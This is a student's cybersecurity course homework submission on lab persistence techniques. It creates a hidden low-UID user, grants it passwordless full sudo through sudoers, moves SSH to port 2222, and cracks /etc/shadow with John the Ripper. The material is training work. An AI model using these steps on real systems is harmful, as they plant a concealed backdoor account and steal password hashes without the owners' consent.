## Rob Myers Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:

    - `sudo adduser --no-create-home sysd` 
   
2. Give your secret user a password: 

    - `no command, answered promps as directed after creating user sysd`   
                     or
    - `if logged in as sysd, then enter passwd`           
    - `if logged in as sysadmin, then enter passwd sysd`

3. Give your secret user a system UID < 1000:

    - `sudo usermod -u 869 sysd`
         
      ![picture](IMAGE/sysdID.PNG)    
                                                      
4. Give your secret user the same GID:

    - `sudo groupmod -g 869 sysd`
       
      ![picture](IMAGE/sysdID.PNG)

5. Give your secret user full `sudo` access without the need for a password:

   -  sudo visudo
   -  enter pass word
   -  /etc/sudoers.tmp folder
   
   -  root    ALL=(ALL:ALL) ALL
   -  sysd    ALL=(ALL:ALL) NOPASSWD:ALL      

6. Test that `sudo` access works without your password:

    - sudo -l 
    - (ALL : ALL) NOPASSWD: ALL  
         
      ![description](IMAGE/su_acc_nopass.PNG) 

NOTE: there are many other ways to modify your user. Here is another example that accomplishes similar tasks that are asked in the homework questions but done in one command: 

sudo adduser --no-create-home --uid 869 --disabled-password sysd

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    -sudo nano /etc/ssh/sshd_config
    - Port 2222

    ![description](IMAGE/step_2.PNG)

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `sudo systemctl restart ssh`

2. Exit the `root` account:
    - `exit`

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `ssh sysadmin@192.168.6.105 -p 2222`

![description](IMAGE/step3_1.PNG)

4. Use `sudo` to switch to the root user:
    - `sudo su`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `ssh sysd@192.168.6.105 -p 2222`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `sudo john /etc/shadow`
 
    ![description](IMAGE/passwd8.PNG)

?? 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

